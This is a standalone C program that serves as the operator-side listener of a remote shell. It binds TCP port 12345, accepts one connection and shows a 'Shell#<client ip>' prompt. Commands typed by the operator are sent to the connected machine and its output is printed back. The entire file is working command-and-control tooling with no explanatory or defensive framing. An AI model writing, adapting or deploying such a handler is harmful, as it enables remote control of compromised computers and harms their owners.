#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

int main()
{
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    //int i = 0;
    int opt_val = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1)
    {
        printf("Failed to create socket\n");
        exit(1);
    }

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt_val, sizeof(opt_val))<0)
    {
        printf("Error setting TCP socket options!\n");
        return 1;
    }
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;//inet_addr("192.168.0.106")
    server_address.sin_port = htons(12345);

    if(bind(sock, (struct sockaddr *) &server_address, sizeof(server_address))!=0)
    {
        perror("failed to bind");
        close(sock);
        exit(1);
    }
    else
        printf("bind successful\n");
    //printf("s\n");
    listen(sock, 5);
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
    //printf("here\n");

    while(1)
    {
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");//remove \n from buffer
        write(client_socket, buffer, sizeof(buffer));
        if(strncmp("q", buffer, 1)==0)
            break;
        else if(strncmp("cd ", buffer, 3)==0)
            continue;
        else
        {
            //printf("%s\n", buffer);
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s\n", response);
        }
    }
    close(client_socket);
    close(sock);
}